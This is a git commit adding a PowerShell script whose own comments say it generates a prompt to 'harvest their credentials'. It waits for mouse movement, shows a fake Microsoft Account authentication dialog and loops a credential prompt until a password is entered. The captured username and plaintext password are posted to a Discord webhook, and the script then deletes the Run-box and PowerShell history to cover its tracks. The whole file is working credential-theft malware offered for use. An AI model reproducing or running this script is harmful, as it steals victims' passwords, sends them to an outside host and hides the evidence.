b9b0677f1e2ec432506fad2fe3e4d50c14cd0b0a
nidez <pistolesi.marco@gmail.com>
2024-01-24 02:13:00 +0100

    Create user-aut-request.ps1

---
+++ user-aut-request.ps1
@@ -0,0 +1,133 @@
+
+
+<#
+
+.NOTES 
+	This is to generate the ui.prompt you will use to harvest their credentials
+#>
+
+function Get-Creds {
+
+    $form = $null
+
+    while ($form -eq $null)
+    {
+        $cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); 
+        $cred.getnetworkcredential().password
+
+        if([string]::IsNullOrWhiteSpace([Net.NetworkCredential]::new('', $cred.Password).Password))
+        {
+            if(-not ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.ManifestModule -like "*PresentationCore*" -or $_.ManifestModule -like "*PresentationFramework*" }))
+            {
+                Add-Type -AssemblyName PresentationCore,PresentationFramework
+            }
+
+            $msgBody = "Credentials cannot be empty!"
+            $msgTitle = "Error"
+            $msgButton = 'Ok'
+            $msgImage = 'Stop'
+            $Result = [System.Windows.MessageBox]::Show($msgBody,$msgTitle,$msgButton,$msgImage)
+            Write-Host "The user clicked: $Result"
+            $form = $null
+        }
+        
+        else{
+            $creds = $cred.GetNetworkCredential() | fl
+            return $creds
+        }
+    }
+}
+
+#----------------------------------------------------------------------------------------------------
+
+<#
+
+.NOTES 
+	This is to pause the script until a mouse movement is detected
+#>
+
+function Pause-Script{
+Add-Type -AssemblyName System.Windows.Forms
+$originalPOS = [System.Windows.Forms.Cursor]::Position.X
+$o=New-Object -ComObject WScript.Shell
+
+    while (1) {
+        $pauseTime = 3
+        if ([Windows.Forms.Cursor]::Position.X -ne $originalPOS){
+            break
+        }
+        else {
+            $o.SendKeys("{CAPSLOCK}");Start-Sleep -Seconds $pauseTime
+        }
+    }
+}
+
+#----------------------------------------------------------------------------------------------------
+
+# This script repeadedly presses the capslock button, this snippet will make sure capslock is turned back off 
+
+function Caps-Off {
+Add-Type -AssemblyName System.Windows.Forms
+$caps = [System.Windows.Forms.Control]::IsKeyLocked('CapsLock')
+
+#If true, toggle CapsLock key, to ensure that the script doesn't fail
+if ($caps -eq $true){
+
+$key = New-Object -ComObject WScript.Shell
+$key.SendKeys('{CapsLock}')
+}
+}
+#----------------------------------------------------------------------------------------------------
+
+<#
+
+.NOTES 
+	This is to call the function to pause the script until a mouse movement is detected then activate the pop-up
+#>
+
+Pause-Script
+Caps-Off
+
+Add-Type -AssemblyName PresentationCore,PresentationFramework
+$msgBody = "Please authenticate your Microsoft Account."
+$msgTitle = "Authentication Required"
+$msgButton = 'Ok'
+$msgImage = 'Warning'
+$Result = [System.Windows.MessageBox]::Show($msgBody,$msgTitle,$msgButton,$msgImage)
+Write-Host "The user clicked: $Result"
+
+$creds = Get-Creds
+
+#------------------------------------------------------------------------------------------------------------------------------------
+
+function Upload-Discord {
+[CmdletBinding()]
+param (
+    [parameter(Position=0,Mandatory=$False)]
+    [string]$file,
+    [parameter(Position=1,Mandatory=$False)]
+    [string]$text 
+)
+$hookurl = "$dc"
+$Body = @{
+  'username' = $env:username
+  'content' = $text
+}
+if (-not ([string]::IsNullOrEmpty($text))){
+Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};
+if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
+}
+if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -text "$creds"}
+
+#------------------------------------------------------------------------------------------------------------------------------------
+
+# Delete run box history
+
+reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
+
+# Delete powershell history
+
+Remove-Item (Get-PSreadlineOption).HistorySavePath
+
+
+exit
